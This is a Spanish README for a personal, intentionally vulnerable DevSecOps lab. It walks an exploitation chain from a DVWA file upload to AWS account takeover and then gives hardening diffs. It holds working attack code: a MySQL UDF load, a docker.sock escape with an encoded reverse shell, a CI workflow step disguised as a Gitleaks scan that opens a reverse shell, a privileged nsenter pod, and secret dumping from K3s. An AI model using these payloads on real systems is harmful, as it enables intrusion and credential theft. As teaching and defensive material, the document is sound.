# DevSecOps Vulnerable Lab — Cadena de explotación end-to-end (y su remediación)

> Laboratorio personal DEV-SEC-OPS que abarca desde la capa cloud en AWS, pasando por Kubernetes, el repositorio de código fuente (Gitea), la pipeline y la aplicación web vulnerable (DVWA) conectada a la base de datos (MySQL). Son seis capas intencionadamente vulnerables con fines demostrativos.

> El objetivo es documentar cómo varias configuraciones inseguras, cada una sin aparente impacto por separado, se combinan para comprometer toda la jerarquía: desde una subida de fichero en una aplicación web hasta el acceso a la cuenta cloud, junto a la versión corregida de cada configuración vulnerable.

> Aisladas, la mayoría de estas malas configuraciones pasaría una revisión sin incidencias. El riesgo aparece cuando las capas tienen conexión entre sí: un rol IAM demasiado abierto no tiene efecto hasta que algo puede alcanzarlo; un `docker.sock` con permisos laxos es inofensivo hasta que un contenedor lo monta.

![Status](https://img.shields.io/badge/status-active-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE-11%2F14%20tácticas-red)
![Layers](https://img.shields.io/badge/capas-6-8957e5)

<p align="center">
  <img src="docs/animations/01-kill-chain.gif" alt="Cadena de ataque completa, de DVWA a IaC" width="860">
  <br><em>Recorrido de la cadena, capa a capa, desde la subida del fichero en la web DVWA hasta el control a nivel cloud.</em>
</p>

<!-- GUION · 01-kill-chain.gif -----------------------------------------------
     6 nodos encendiéndose en secuencia (DVWA → MySQL → Host → CI/CD → K8s → IaC).
     Bajo cada arco aparece la CONDICIÓN que lo hace posible (config.inc.php,
     docker.sock 0777, kubeconfig root, runner secrets, PassRole *).
     ~12 s, loop suave. Formato: GIF o webm ≤ 3 MB.
------------------------------------------------------------------------------>

---

**Stack:** AWS (Simulación local mediante) LocalStack · Terraform · Ansible · Kubernetes (K3s) · Gitea + Act-Runner · DVWA · MySQL

---

## Arquitectura

<details>
<summary><strong>Mapa, estructura del repositorio y tabla de controles rotos</strong></summary>

### Mapa de infraestructura

Una VPC con una única subnet pública, una instancia EC2 expuesta directamente a internet, un Security Group sin restricción de origen, un bucket S3 sin bloqueo de acceso público y roles IAM sobreprivilegiados. 
A nivel de host, el firewall está desactivado y `docker.sock` tiene permisos de escritura para cualquier usuario. En Kubernetes, el runner de CI/CD se ejecuta con `privileged: true` y el socket de Docker del host montado dentro del pod.

Ninguna de estas configuraciones es crítica por sí sola. En conjunto, forman una ruta desde la aplicación pública hasta el acceso a la cuenta cloud.

### Estructura del repositorio

```
.
├── 01-cloud-iac
│   ├── hardened/            # Misma infraestructura, versión endurecida
│   └── vulnerable/          # ec2.tf · iam.tf · network.tf · provider.tf · s3.tf
├── 02-provisioning
│   ├── site_hardened.yml
│   └── site_vulnerable.yml
├── 03-k8s-cluster
│   ├── act-runner.yaml
│   └── gitea-deployment.yaml
└── 04-cicd-pipeline
    └── devsecops-demo/
        ├── .gitea/workflows/    # Pipelines CI/CD
        ├── k8s/vulnerable/      # DVWA + MySQL
        └── src/vulnerable/      # Código fuente DVWA
```

### Controles de seguridad rotos

| Control roto | Fichero | Vulnerabilidad | Severidad | Se explota en |
|---|---|---|---|---|
| **Identidad (IAM)** | `iam.tf` | Trust policy con `Principal = "*"` | 🔴 Crítica | Capa 6 |
| **Identidad (IAM)** | `iam.tf` | `iam:PassRole` sin restricción de `Resource` | 🔴 Crítica | Capa 6 |
| **Identidad (IAM)** | `iam.tf` | Usuario con `AdministratorAccess` directo | 🔴 Crítica | Capa 6 |
| **Acceso a red** | `network.tf` | SSH (22) abierto a `0.0.0.0/0` | 🟠 Alta | Capa 3 |
| **Acceso a red** | `network.tf` | Docker API sin cifrar (2375) a `0.0.0.0/0` | 🔴 Crítica* | Capa 3 |
| **Acceso a red** | `network.tf` | Egress sin restricción | 🟠 Alta | Capa 6 |
| **Exposición de datos** | `s3.tf` | Bloqueo de acceso público desactivado | 🟠 Alta | Capa 6 |
| **Exposición de datos** | `s3.tf` | Bucket policy con `Principal = "*"` | 🔴 Crítica | Capa 6 |
| **Aislamiento (host)** | `site_vulnerable.yml` | UFW desactivado | 🟠 Alta | Capa 3 |
| **Aislamiento (host)** | `site_vulnerable.yml` | `docker.sock` con permisos `0777` | 🔴 Crítica | Capa 3 |
| **Aislamiento (contenedor)** | `act-runner.yaml` | Runner en `privileged: true` | 🔴 Crítica | Capa 4 |
| **Aislamiento (contenedor)** | `act-runner.yaml` | `docker.sock` del host montado en el pod | 🔴 Crítica | Capa 4 |
| **Gestión de secretos** | `gitea-deployment.yaml` | `SECRET_KEY`/`INTERNAL_TOKEN`/`JWT_SECRET` hardcodeados | 🟠 Alta | Capa 4 |

> **\* Nota sobre el puerto 2375.** El Security Group abierto en 2375 no es explotable por sí mismo: requiere que la Docker API escuche efectivamente en ese puerto sin autenticación. En este laboratorio no lo hace por esa vía; la explotación real usa el socket Unix con permisos `0777` de la Capa 3. Se marca como crítico condicional porque amplifica otro hallazgo, no porque sea una vía de entrada independiente. Un escáner automático lo reporta como crítico sin esa distinción; a efectos de priorización, la diferencia es relevante.

### Configuración vulnerable (extracto)

```hcl
# iam.tf — cualquier principal puede asumir el rol, pasar cualquier rol, y hay un admin directo
resource "aws_iam_role" "overprivileged_role" {
  assume_role_policy = jsonencode({ Statement = [{ Action = "sts:AssumeRole", Effect = "Allow", Principal = "*" }] })
}
resource "aws_iam_policy" "passrole_unrestricted" {
  policy = jsonencode({ Statement = [{ Effect = "Allow", Action = "iam:PassRole", Resource = "*" }] })
}
resource "aws_iam_user_policy_attachment" "user_admin_attach" {
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}
```

```yaml
# site_vulnerable.yml — configuración de host que habilita el control de Docker
- name: Desactivar Firewall (UFW)
  ufw: { state: disabled }
- name: Socket de Docker con permisos para todos los usuarios (0777)
  file: { path: /var/run/docker.sock, mode: '0777' }
```

</details>

---

## Explotación de la cadena

> **Aviso legal y ético.** Todo el ejercicio se ejecuta en un entorno aislado (red local + LocalStack), sin conexión a producción ni a terceros, sobre infraestructura propia desplegada con fines educativos. Reproducir estas técnicas contra sistemas sin autorización explícita del propietario es ilegal.

Para seguir la sección conviene manejar SQL, PHP, Bash/Python y manifiestos de Kubernetes a nivel básico, entender contenedores, orquestación e IaC a nivel conceptual, y tener el laboratorio desplegado (ver Despliegue) con conectividad entre Kali (`192.168.252.20`) y el clúster (`192.168.252.10`).

<p align="center">
  <img src="docs/animations/02-progress.gif" alt="Progreso de la cadena, capa a capa" width="720">
  <br><em>Estado de la cadena a medida que se compromete cada capa.</em>
</p>

<!-- GUION · 02-progress.gif ------------------------------------------------
     La línea `[✓] DVWA → [✓] MySQL → ...` marcándose sola, un tick por capa,
     sincronizada con el scroll de las 6 subsecciones. Opcional. ~6 s.
------------------------------------------------------------------------------>

<details open>
<summary><strong>Capa 1 · Acceso inicial — DVWA</strong></summary>

DVWA ofrece tres vectores de entrada directos: SQLi, Command Injection y File Upload/LFI. Se usa la combinación File Upload + LFI porque proporciona ejecución de PHP arbitrario en el servidor, es decir, una shell interactiva. La SQLi se habría limitado a extracción de datos, sin ejecución; para pivotar entre capas, una shell da más margen que una inyección ciega.

Antes de plantear el pivote se comprueba si el propio contenedor de DVWA permite escalar. No hay ningún vector local aprovechable:

```bash
whoami                                   # → www-data
sudo -l                                  # → sudo: command not found
getcap -r / 2>/dev/null                  # → (vacío: sin binarios con capabilities)
grep Cap /proc/self/status               # → CapEff: 0000000000000000
ls -la /var/run/docker.sock             # → No such file or directory
cat /proc/mounts                         # → solo montajes estándar de K8s, sin binds del host
ls /var/run/secrets/.../serviceaccount/  # → token presente, pero localsubjectrulesreviews → 403
env                                      # → solo variables de Apache, sin credenciales
```

El contenedor de DVWA está correctamente aislado. La enumeración se documenta de forma explícita porque confirma que no hay nada aprovechable a nivel local y justifica que el siguiente movimiento sea lateral, hacia otra capa, en lugar de una escalada dentro del contenedor.

El dato que permite continuar no proviene de un escaneo de red (realizado íntegramente en PHP, sin `nmap`), sino de un fichero de configuración de la aplicación:

```bash
cat /var/www/html/config/config.inc.php
# $_DVWA['db_user']     = 'app'
# $_DVWA['db_password'] = 'vulnerables'
```

```php
// Verificación de credenciales, solo con PHP (sin nc, sin curl)
php -r '$c=new mysqli("mysql-service","app","vulnerables"); echo $c->connect_error?"FAIL":"OK";'   // → OK
php -r '$c=new mysqli("mysql-service","app","vulnerables"); $r=$c->query("SHOW GRANTS"); while($x=$r->fetch_row()) echo $x[0];'
// → GRANT ALL PRIVILEGES ON `dvwa`.* TO 'app'@'%'
```

#### Ficha de riesgo — DVWA

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | WAF + validación estricta de extensión/contenido en uploads |
| Execution | Command & Scripting Interpreter: PHP | T1059.004 | Deshabilitar ejecución de scripts en directorios de upload |
| Discovery | Network Service Discovery | T1046 | NetworkPolicy entre namespaces |
| Credential Access | Credentials in Files | T1552.001 | Secretos en Vault/Secrets Manager, nunca en ficheros de app |

> **Nota.** El acceso inicial se obtiene a través de la aplicación web, pero el dato que permite continuar es la contraseña de la base de datos almacenada en texto plano en `config.inc.php`. Los secretos en ficheros de configuración son un vector de credential access habitual, independiente de la calidad del código de la aplicación.

</details>

<details>
<summary><strong>Capa 2 · Pivote a MySQL — UDF Abuse</strong></summary>

El pod de **MySQL** está configurado con `privileged: true`, la capability `SYS_ADMIN` y el socket de Docker del host montado dentro del contenedor. El montaje del socket se utiliza en la Capa 3; en esta capa el objetivo es obtener ejecución de comandos dentro del contenedor de MySQL.

```yaml
# mysql-deployment (vulnerable)
securityContext:
  capabilities: { add: [SYS_ADMIN] }
  privileged: true
volumeMounts:
  - { mountPath: /var/run/docker.sock, name: docker-sock }
volumes:
  - hostPath: { path: /var/run/docker.sock, type: Socket }
    name: docker-sock
```

**UDF Abuse.** La técnica requiere el privilegio `FILE`, conocer la ruta exacta del `plugin_dir` y disponer de una librería `.so` compatible con la arquitectura. Los tres pasos se lanzan desde la shell de DVWA como `www-data`:

```php
// 1 — Subir la librería UDF a una tabla auxiliar (hex)
$so  = file_get_contents("https://raw.githubusercontent.com/Rapid7/metasploit-framework/master/data/exploits/mysql/lib_mysqludf_sys_64.so");
$c   = new mysqli("mysql-service","app","vulnerables","dvwa");
$c->query("CREATE TABLE IF NOT EXISTS udf_blob(line LONGBLOB)");
$c->query("INSERT INTO udf_blob VALUES(UNHEX('".bin2hex($so)."'))");

// 2 — Volcar la .so al plugin_dir
$c->query("SELECT line FROM udf_blob INTO DUMPFILE '/usr/lib64/mysql/plugin/udf_sys.so'");

// 3 — Registrar sys_eval y confirmar la ejecución de comandos
$c->query("CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf_sys.so'");
$r = $c->query("SELECT sys_eval('id') AS cmd")->fetch_assoc();
// → uid=999(mysql) gid=999(mysql)
```

En este punto se dispone de ejecución de comandos dentro del contenedor de MySQL, con el usuario `mysql` (uid 999). El escape al host se desarrolla en la Capa 3.

#### Ficha de riesgo — MySQL

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Execution | Exploitation for Client Execution (UDF Abuse) | T1203 | Restringir el privilegio `FILE`; `secure_file_priv` acotado |
| Credential Access | Credentials in Files | T1552.001 | Credenciales de BD fuera de ficheros de aplicación |

> **Nota.** El acceso a MySQL usa las credenciales obtenidas en la Capa 1, no una vulnerabilidad de la base de datos. El privilegio `FILE`, junto con un `plugin_dir` escribible, es suficiente para cargar una UDF y ejecutar comandos del sistema.

</details>

<details>
<summary><strong>Capa 3 · Escape al host vía docker.sock</strong></summary>

El pod de MySQL tiene montado `/var/run/docker.sock` (ver el manifiesto de la Capa 2). Con ejecución de comandos como `mysql`, ese socket permite crear contenedores en el daemon de Docker del host y, con ellos, salir del contenedor. Es la parte técnicamente más delicada de la cadena.

La imagen de MySQL no incluye la CLI de Docker ni `curl`, por lo que las peticiones al Docker Engine API se construyen a mano sobre el socket Unix, usando el módulo `socket` de Python.

<p align="center">
  <img src="docs/animations/03-docker-escape.gif" alt="Escape de contenedor a root en el host vía docker.sock" width="820">
  <br><em>Contenedor MySQL → contenedor efímero con <code>Binds: /:/mnt/host</code> → root en el nodo.</em>
</p>

<!-- GUION · 03-docker-escape.gif -------------------------------------------
     Split screen: izquierda el pod MySQL (uid 999), derecha el host.
     Se dibuja la petición HTTP cruda al socket, nace `escape1` (alpine),
     el chroot al host montado, y el prompt cambia a root@host. ~15 s.
------------------------------------------------------------------------------>

```python
# escape.py — crea un contenedor efímero con el host montado y NetworkMode host
import socket, json, base64
cmd = "chroot /mnt/host /bin/bash -c 'bash -i >& /dev/tcp/192.168.252.20/5555 0>&1'"
payload = json.dumps({
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh","-c","echo "+base64.b64encode(cmd.encode()).decode()+" | base64 -d | sh"],
    "HostConfig": {"Binds": ["/:/mnt/host"], "NetworkMode": "host", "Privileged": True}
})
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.connect("/var/run/docker.sock")
s.sendall(("POST /containers/create?name=escape1 HTTP/1.1\r\nHost: localhost\r\n"
           "Content-Type: application/json\r\nContent-Length: %d\r\n\r\n%s" % (len(payload), payload)).encode())
s2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s2.connect("/var/run/docker.sock")
s2.sendall(b"POST /containers/escape1/start HTTP/1.1\r\nHost: localhost\r\n\r\n")
```

Varios campos del payload resuelven fallos que no producen ningún mensaje de error, solo la ausencia del resultado esperado:

- **`alpine` en lugar de `mysql:5.7`.** La imagen de MySQL es mínima y no incluye `mount`, `chroot` ni `nsenter`; Alpine sí. Se puede comprobar qué binarios trae una imagen arrancando un contenedor efímero con `which mount chroot nsenter` como comando y leyendo sus logs.
- **`NetworkMode: host`.** Sin este parámetro, el contenedor efímero queda en la bridge por defecto (`172.17.0.0/16`) y la reverse shell hacia `192.168.252.20` sale por el NAT de Docker, sin alcanzar el destino y sin producir error. Con `host`, el contenedor comparte la pila de red del nodo, sin NAT, y la conexión saliente funciona.
- **`Binds: ["/:/mnt/host"]` en lugar de `mount --bind`.** El daemon resuelve `Binds` antes de arrancar el contenedor; hacerlo manualmente dentro del comando genera conflictos de punto de montaje y requiere `mount` en la imagen.
- **Base64.** Evita el quoting anidado entre PHP, el JSON y la shell del contenedor, que rompía el script de forma inconsistente.
- **Sin f-strings.** El contenedor de MySQL ejecuta Python 2; la concatenación de cadenas se hace con `+`.

Cuando la conexión llega al `nc -lvnp 5555`, la shell es root en el host, no en un contenedor: el `chroot` al filesystem del host montado hace que el entorno sea el del anfitrión.

#### Ficha de riesgo — Escape al host

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Escape to Host | T1611 | No montar `docker.sock` en pods; runtime rootless / gVisor |
| Privilege Escalation | Abuse Elevation Control: Container Privileged | T1548 | Prohibir `privileged`/`SYS_ADMIN` mediante PSA / OPA |
| Lateral Movement | Container Administration Command | T1021.007 | TLS mutuo obligatorio en el Docker Engine API |

> **Nota.** Un contenedor de base de datos no requiere acceso al daemon de Docker. Montar `/var/run/docker.sock` dentro del pod equivale a conceder control del host, con independencia del resto de restricciones del contenedor. El montaje procedía de una configuración para builds locales y no se retiró al desplegar en el clúster; en los manifiestos el contenedor sigue pareciendo aislado.

</details>

<details>
<summary><strong>Capa 4 · CI/CD — Gitea / Act-Runner</strong></summary>

Con root en el host, los datos de Gitea (persistidos mediante `hostPath`) son legibles directamente:

```bash
cat /var/lib/gitea-data/app.ini
# [security] SECRET_KEY = secretkeylabdevsecops
#            INTERNAL_TOKEN = eyJhbGci...
# [oauth2]   JWT_SECRET = eyJhbGci...
```

`SECRET_KEY` cifra las cookies de sesión, `INTERNAL_TOKEN` autentica la comunicación interna y `JWT_SECRET` firma los tokens OAuth2. Con cualquiera de los tres en texto plano es posible forjar sesiones o tokens válidos sin credenciales de usuario. Además, el manifiesto del runner expone su token de registro en el comando de arranque.

**Poisoned Pipeline Execution (PPE).** El runner ejecuta los jobs en el mismo contexto que los legítimos (con `docker.sock` del host y `privileged: true`), por lo que basta con introducir una línea en un workflow. El paso se presenta como una tarea habitual:

```yaml
- name: Gitleaks Scan
  continue-on-error: true          # el job se reporta OK aunque el paso legítimo falle
  run: |
    nohup bash -c "$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1Mi4yMC80NDg4IDA+JjEn | base64 -d)" >/dev/null 2>&1 &
    gitleaks detect --source="."   # → decodificado: bash -i >& /dev/tcp/192.168.252.20/4488 0>&1
```

La combinación de `base64` y `continue-on-error` tiene un efecto concreto: en una revisión de PR superficial el paso aparece como un escaneo de secretos, el pipeline se reporta correctamente y la reverse shell arranca en segundo plano.

#### Ficha de riesgo — CI/CD

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Execution | Supply Chain Compromise (CI/CD) | T1195.002 | CODEOWNERS + protected branches en `.gitea/workflows/` |
| Credential Access | Credentials in Files | T1552.001 | Secretos fuera del ConfigMap (gestor de secretos) |
| Persistence | Compromise Infrastructure: CI/CD | T1584 | Runners efímeros, sin `privileged` ni socket |
| Defense Evasion | Obfuscated Files or Information | T1027 | Escaneo estático de workflows (patrón `base64 -d \| sh`) |

> **Nota.** El runner dispone por diseño de las credenciales de despliegue: `kubeconfig`, credenciales cloud y claves de firma. Comprometerlo no requiere ninguna técnica de escalada nueva: hereda los privilegios que el proceso de despliegue ya tiene. El nivel de acceso del CI/CD equivale al de la infraestructura que gestiona y debería tratarse como un componente de producción en el modelo de amenazas.

</details>

<details>
<summary><strong>Capa 5 · Kubernetes (K3s)</strong></summary>

Hay dos formas de llegar al clúster; en un entorno real rara vez se dispone de las dos a la vez. La primera: el `kubeconfig` de `cluster-admin` es legible desde el host (`/etc/rancher/k3s/k3s.yaml`) tras el escape de la Capa 3. La segunda: el Act-Runner suele llevar credenciales de despliegue equivalentes inyectadas como secreto.

**Pod con acceso al PID 1 del host:**

```yaml
# malicious-pod.yaml
apiVersion: v1
kind: Pod
metadata: { name: node-access-pod }
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: c
    image: alpine:latest
    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n sh"]
    securityContext: { privileged: true }
    volumeMounts: [{ mountPath: /host, name: host-root }]
  volumes: [{ name: host-root, hostPath: { path: / } }]
```

<p align="center">
  <img src="docs/animations/04-nsenter.gif" alt="Acceso al namespace PID 1 del host vía nsenter" width="820">
  <br><em><code>nsenter -t 1 -m -u -i -n sh</code>: entrar al namespace del proceso init equivale a una sesión root en el nodo.</em>
</p>

<!-- GUION · 04-nsenter.gif -------------------------------------------------
     El pod `node-access-pod` aplicándose; flecha desde el contenedor al proceso
     PID 1 del host; el prompt se convierte en root del nodo. ~10 s.
------------------------------------------------------------------------------>

Un segundo hallazgo es `state.db`. K3s no usa `etcd` por defecto, sino Kine sobre SQLite, en disco. Los Secrets están ahí en base64 y sin cifrado en reposo, salvo que se haya activado `--secrets-encryption`, que no está habilitado por defecto.

```bash
sqlite3 /var/lib/rancher/k3s/server/db/state.db "SELECT name,value FROM kine WHERE name LIKE '%secrets%';"
echo "<valor>" | base64 -d        # incluidas las credenciales AWS que usa el CI/CD
```

#### Ficha de riesgo — Kubernetes

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Escape to Host | T1611 | PSA `restricted`; prohibir `hostPID`/`hostNetwork`/`hostPath` |
| Credential Access | Unsecured Credentials: Kine DB | T1552.007 | `--secrets-encryption`; migrar a `etcd` cifrado |
| Discovery | Permission Groups Discovery: K8s | T1069.003 | RBAC de mínimo privilegio; auditoría de bindings a `cluster-admin` |
| Impact | Data Encrypted/Destruction (potencial) | T1486/T1485 | Backups inmutables; alertas sobre pods `privileged` |

> **Nota.** Un pod con `privileged: true` y `hostPath: /` tiene acceso equivalente a root en el nodo. La abstracción que introduce Kubernetes no aporta aislamiento adicional frente al host cuando se permiten estas opciones; el control se ejerce mediante Pod Security Admission o políticas equivalentes.

</details>

<details>
<summary><strong>Capa 6 · IaC / Cloud</strong></summary>

Con las credenciales AWS obtenidas de Kine (o del runner), los tres hallazgos que ya se leían en el código de la sección de Arquitectura pasan de configuración a explotación:

```bash
export AWS_ACCESS_KEY_ID=<extraído>; export AWS_SECRET_ACCESS_KEY=<extraído>
aws sts get-caller-identity --endpoint-url=http://192.168.252.10:4566

aws iam list-attached-user-policies --user-name dev-user-admin --endpoint-url=...
# → arn:aws:iam::aws:policy/AdministratorAccess

aws sts assume-role --role-arn arn:aws:iam::000000000000:role/devsecops-unrestricted-role \
  --role-session-name lab-session --endpoint-url=...   # → éxito: trust policy Principal: "*"

aws s3 cp ./payload.txt s3://devsecops-public-data-bucket/ --no-sign-request   # sin credenciales
```

De los tres hallazgos, `iam:PassRole` sin `Resource` acotado tiene una consideración particular. No consiste en tener permisos elevados, sino en poder asignar cualquier rol de la cuenta a cualquier servicio, lo que constituye una vía de escalada persistente. Un `AdministratorAccess` adjunto es visible en la primera auditoría; un usuario que aparenta bajo privilegio pero puede asumir cualquier rol bajo demanda es más difícil de detectar.

Todas las condiciones que hacen posible la cadena (el Security Group abierto, el `docker.sock` en `0777`, los pods `privileged`) se despliegan desde este mismo Terraform de forma automatizada. El IaC es la última capa de la cadena y, a la vez, el origen de las condiciones de las capas anteriores.

#### Ficha de riesgo — IaC / Cloud

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 | IAM de mínimo privilegio; revisión de `AdministratorAccess` |
| Privilege Escalation | Abuse Elevation Control: PassRole | T1548 | `Resource` acotado en toda policy con `iam:PassRole` |
| Initial Access | Trusted Relationship / Valid Accounts | T1199/T1078 | `Principal` explícito, nunca `"*"` |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 Block Public Access a nivel de cuenta |

> **Nota.** Ninguna de las técnicas de la cadena es un 0-day; todas explotan configuraciones documentadas. Cada paso aprovecha una decisión de configuración que resulta problemática al existir conectividad entre las capas. La cadena empieza con una subida de fichero y termina con acceso a la cuenta cloud.

</details>

---

## Remediación y hardening

Para cada vulnerabilidad se documenta el diff correspondiente, el control que restaura y el control sistémico que evita que ese tipo de error reaparezca en el siguiente ciclo de desarrollo. Corregir la línea afectada trata el síntoma; intervenir en el proceso que la generó trata la causa.

<p align="center">
  <img src="docs/animations/05-diff-toggle.gif" alt="Comparación entre la versión vulnerable y la endurecida del mismo fichero" width="820">
  <br><em>Comparación entre las versiones vulnerable y endurecida del mismo fichero.</em>
</p>

<!-- GUION · 05-diff-toggle.gif ---------------------------------------------
     Un fichero (p. ej. iam.tf) alternando entre las dos versiones, con las
     líneas rojas (-) desapareciendo y las verdes (+) entrando. ~8 s, loop.
------------------------------------------------------------------------------>

### Resumen

| Capa | Vulnerabilidad | Fix | Pre | Post | Control sistémico |
|---|---|---|:--:|:--:|---|
| IAM | `Principal = "*"` en trust policy | `Principal` a ARN concreto + `ExternalId` | 🔴 | 🟢 | `tfsec`/`checkov` en PR |
| IAM | `PassRole` con `Resource = "*"` | `Resource` acotado por ARN | 🔴 | 🟢 | SCPs en AWS Organizations |
| IAM | `AdministratorAccess` directo | Política de mínimo privilegio | 🔴 | 🟢 | IAM Access Analyzer |
| Red | SSH + Docker API a `0.0.0.0/0` | CIDR restringido; 2375 eliminado | 🟠 | 🟢 | `tfsec aws-ec2-no-public-ingress-sgr` |
| S3 | Bucket público (`Put`/`Get` `*`) | Block Public Access + policy eliminada | 🔴 | 🟢 | S3 BPA a nivel de cuenta |
| Host | UFW deshabilitado | UFW `deny` + ingress explícito | 🟠 | 🟢 | `ansible-lint` + `inspec` |
| Host | `docker.sock` `0777` | `0660`, grupo `docker` | 🔴 | 🟢 | Docker rootless |
| K8s | `privileged` + `hostPath: /` | `privileged: false`, sin `hostPath` | 🔴 | 🟢 | Pod Security Admission `restricted` |
| K8s | Kine sin cifrado | `--secrets-encryption` | 🟠 | 🟠 | Migración a `etcd` cifrado |
| CI/CD | Secretos en ConfigMap | Secret / OIDC federation | 🔴 | 🟢 | Gitleaks pre-commit + OIDC |
| CI/CD | Runner `privileged` + socket | Runner sin socket; Kaniko/Buildah | 🔴 | 🟢 | Runners efímeros |
| App | Secretos en `config.inc.php` | K8s Secret montado como env | 🟠 | 🟢 | External Secrets Operator / Vault |

<details>
<summary><strong>Diffs · IaC (Terraform)</strong></summary>

```diff
# iam.tf
- Principal = "*"
+ Principal = { AWS = "arn:aws:iam::${var.account_id}:root" }
+ Condition = { StringEquals = { "sts:ExternalId" = var.external_id } }

- Action = "iam:PassRole"
- Resource = "*"
+ Action   = "iam:PassRole"
+ Resource = ["arn:aws:iam::${var.account_id}:role/devsecops-ec2-role"]

- policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+ policy_arn = aws_iam_policy.minimal_privilege_policy.arn
```

```diff
# network.tf
- ingress { from_port = 22,   cidr_blocks = ["0.0.0.0/0"] }
+ ingress { from_port = 22,   cidr_blocks = [var.admin_cidr] }
- ingress { from_port = 2375, cidr_blocks = ["0.0.0.0/0"] }   # Docker API sin cifrar
+ # (regla 2375 eliminada — usar SSH tunneling o TLS 2376)
- egress  { protocol = "-1",  cidr_blocks = ["0.0.0.0/0"] }
+ egress  { from_port = 443, protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
```

```diff
# s3.tf
- block_public_acls = false ; block_public_policy = false ; ignore_public_acls = false ; restrict_public_buckets = false
+ block_public_acls = true  ; block_public_policy = true  ; ignore_public_acls = true  ; restrict_public_buckets = true
- # bucket policy con Principal = "*"
+ # (aws_s3_bucket_policy eliminado; + SSE-KMS y versioning habilitados)
```

<details><summary>Versión hardened completa (para copiar-pegar)</summary>

```hcl
# iam.tf — hardened
resource "aws_iam_role" "restricted_role" {
  name = "devsecops-restricted-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole", Effect = "Allow"
      Principal = { AWS = "arn:aws:iam::${var.account_id}:root" }
      Condition = { StringEquals = { "sts:ExternalId" = var.external_id } }
    }]
  })
}
resource "aws_iam_policy" "passrole_restricted" {
  name   = "PassRoleRestrictedPolicy"
  policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow", Action = "iam:PassRole",
    Resource = ["arn:aws:iam::${var.account_id}:role/devsecops-ec2-role"]
  }]})
}
resource "aws_iam_policy" "minimal_privilege_policy" {
  name   = "DevsecopsMinimalPolicy"
  policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow", Action = ["s3:GetObject","ec2:DescribeInstances"], Resource = "*"
  }]})
}

# network.tf — hardened
resource "aws_security_group" "hardened_sg" {
  name = "restricted-management-sg"; vpc_id = aws_vpc.hardened_vpc.id
  ingress { description = "SSH admin only", from_port = 22, to_port = 22, protocol = "tcp", cidr_blocks = [var.admin_cidr] }
  egress  { description = "HTTPS out",      from_port = 443, to_port = 443, protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
  egress  { description = "HTTP out",       from_port = 80,  to_port = 80,  protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
}

# s3.tf — hardened
resource "aws_s3_bucket_public_access_block" "block_all" {
  bucket = aws_s3_bucket.private_bucket.id
  block_public_acls = true; block_public_policy = true; ignore_public_acls = true; restrict_public_buckets = true
}
resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
  bucket = aws_s3_bucket.private_bucket.id
  rule { apply_server_side_encryption_by_default { sse_algorithm = "aws:kms" } }
}
```
</details>

**Control restaurado:** mínimo privilegio en las tres dimensiones de IAM (quién asume, qué delega, qué hace), denegación por defecto en red y cierre de la exposición de datos.
**Control sistémico:** `tfsec`/`checkov` bloquean `Principal:*`, `PassRole Resource:*` y los adjuntos de admin antes del `apply`. El control con mejor relación impacto/esfuerzo de esta capa es S3 Block Public Access a nivel de cuenta, que invalida cualquier policy pública en todos los buckets con una sola configuración.

</details>

<details>
<summary><strong>Diffs · Provisioning (Ansible)</strong></summary>

```diff
- - name: Desactivar Firewall (UFW)
-   ufw: { state: disabled }
+ - name: Habilitar UFW con política deny por defecto
+   ufw: { state: enabled, policy: deny }
+ - name: Permitir SSH solo desde la red de administración
+   ufw: { rule: allow, port: 22, proto: tcp, src: "{{ admin_network_cidr }}" }

- - name: Socket de Docker 0777
-   file: { path: /var/run/docker.sock, mode: '0777' }
+ - name: Socket de Docker restringido al grupo docker
+   file: { path: /var/run/docker.sock, owner: root, group: docker, mode: '0660' }
+ - name: Deshabilitar Docker API sin cifrar (2375)
+   lineinfile: { path: /etc/docker/daemon.json, line: '{"hosts":["unix:///var/run/docker.sock"]}', create: yes }
+ - name: Auditoría del socket de Docker
+   lineinfile: { path: /etc/audit/rules.d/docker.rules, line: "-w /var/run/docker.sock -p rwxa -k docker_socket", create: yes }
```

**Control restaurado:** el socket queda restringido a `root` y al grupo `docker`, y el firewall vuelve a denegar por defecto.
**Control sistémico:** `ansible-lint` marca `mode: '0777'` y `ufw: disabled` como error en el pipeline; `inspec`/`auditd` lo validan tras el despliegue.

</details>

<details>
<summary><strong>Diffs · Kubernetes</strong></summary>

```diff
# mysql / act-runner
  securityContext:
-   capabilities: { add: [SYS_ADMIN] }
-   privileged: true
+   allowPrivilegeEscalation: false
+   runAsNonRoot: true
+   readOnlyRootFilesystem: true
+   capabilities: { drop: ["ALL"] }
  volumeMounts:
-   - { mountPath: /var/run/docker.sock, name: docker-sock }   # eliminado
  volumes:
-   - hostPath: { path: /var/run/docker.sock }                 # eliminado
+   # builds vía Kaniko/Buildah, sin acceso al daemon del host
```

```yaml
# Pod Security Admission a nivel de namespace — enforcement nativo, sin webhook externo
metadata:
  labels:
    pod-security.kubernetes.io/enforce: restricted
